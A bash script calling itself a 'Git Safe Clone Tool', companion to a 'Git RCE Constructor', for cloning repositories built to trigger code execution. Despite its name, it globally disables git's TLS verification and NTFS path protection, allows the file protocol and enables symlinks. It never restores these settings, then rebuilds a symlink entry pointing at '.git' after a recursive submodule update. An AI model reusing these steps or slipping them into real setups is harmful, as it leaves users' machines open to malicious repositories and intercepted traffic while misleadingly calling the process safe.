#!/bin/bash
set +x
echo Git Safe Clone Tool v1.7
echo -e "\033]0;Git Safe Clone Tool v1.7\007"
echo Notice: This tool can only safely clone repositories created using Git RCE Constructor.
echo There is no guaranteed success for cloning repositories created using other tools!
read -r -p "Repository URL: " main_repo_path
set -x
git config --global protocol.file.allow always
git config --global core.protectNTFS false
git config --global http.sslVerify false
git config --global core.symlinks true
if [ -z "$(git config --global user.name)" ]; then
git config --global user.name "$USERNAME"
fi
if [ -z "$(git config --global user.email)" ]; then
git config --global user.email "$USERNAME"
fi
echo Cloning repo...
mkdir -p git_rce_main
if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
fsutil file setcasesensitiveinfo git_rce_main disable
fi
git clone --no-recursive "$main_repo_path" git_rce_main
cd git_rce_main
git rm gitlnk
git submodule update --init --recursive
git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
set +x
echo All done!
echo -n "Press any key to continue . . ."
read -N 1
exit 0
